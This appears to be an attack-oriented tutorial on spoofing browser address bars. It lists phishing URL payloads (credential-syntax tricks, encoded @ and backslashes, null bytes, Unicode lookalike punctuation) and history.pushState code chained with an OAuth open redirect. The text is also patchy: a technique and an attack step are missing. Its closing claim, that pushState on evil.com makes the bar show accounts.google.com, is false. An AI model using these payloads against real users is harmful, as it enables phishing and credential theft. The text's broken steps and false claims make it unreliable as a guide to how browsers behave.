How URL Eliding Works

Browsers have limited address bar width. Long URLs are truncated ("elided") with "...". Chrome specifically elides the path/query and emphasizes only the eTLD+1 (registered domain). Bugs occur when: the eTLD+1 detection is wrong, special characters confuse the parser, or truncation hides the real domain.

What Chrome shows (eTLD+1 emphasis):
🔒 google.com
← Real URL: https://accounts.google.com/o/oauth2/auth?client_id=... (path hidden)
Attack: long subdomain to push real domain off-screen
🔒 accounts.google.com.very-long-subdomain-that-pushes-origin-off-sc...
← Real: evil.com — but the visible text starts with "accounts.google.com"

Technique 1: Long Path Confusion

Use a very long URL path that causes the browser to truncate, hiding the actual domain structure. The visible portion looks like a trusted URL. 

// URLs that can confuse truncation:

// Chrome emphasizes "evil-domain.com" (correct)
// But: some browsers may truncate from left and show "...google.com..." in path

Technique 3: User@Host Confusion (Credential Syntax)

URLs support user:password@host syntax. Putting a trusted domain in the "user" part makes the address bar potentially show the trusted domain. Modern browsers strip this for HTTP(S) but some edge cases remain. 

// Format: https://user:pass@host/path
// Attack: https://google.com@evil.com/
// → user = "google.com", host = "evil.com"
// Modern Chrome: shows warning / strips credentials
// Old browsers: showed "google.com" in URL display
// Test mobile browsers: Samsung Internet, UC Browser, Opera Mini

// Also test:
// https://google.com%40evil.com/        (URL-encoded @)
// https://google.com%2540evil.com/      (double-encoded)
// https://google.com:evil.com@host/     (colon confusion)

Technique 4: Special Characters in URL

Special characters can confuse URL parsers and display logic. Some characters cause the browser to display a different portion of the URL. 

// Null byte in URL (some old parsers stop at null):
// https://evil.com%00google.com
// → displayed: "evil.com" but parser stops and shows nothing after %00

// Slash confusion:
// https://google.com\@evil.com/    (backslash as separator)
// https://google.com%5c@evil.com/  (URL-encoded backslash)

// Fragment confusion:
// https://evil.com#https://google.com/login
// → fragment shown in bar? Some mobile bars show fragment text

// Unicode punctuation lookalikes:
// https://evil.com／google.com  (U+FF0F fullwidth slash)
// https://evil․com              (U+2024 one dot leader as period)

Technique 5: history.pushState URL Confusion

Use history.pushState to change the displayed URL path to something misleading. Works same-origin only, but combined with open redirect = cross-origin attack. 

// Same-origin: change URL display
history.pushState({}, '', '/google.com/login?spoofed=true');
// Address bar shows: current-origin.com/google.com/login
// User might see: ".../google.com/login" and think it's Google

// Combined with open redirect:
// 1. Find: https://accounts.google.com/o/oauth2/auth?redirect_uri=ANY_URL

// 3. Landing on evil.com: history.pushState({}, '', '/signin/v2/identifier')
// Result: address bar shows https://accounts.google.com/signin (Google!) but serving evil content
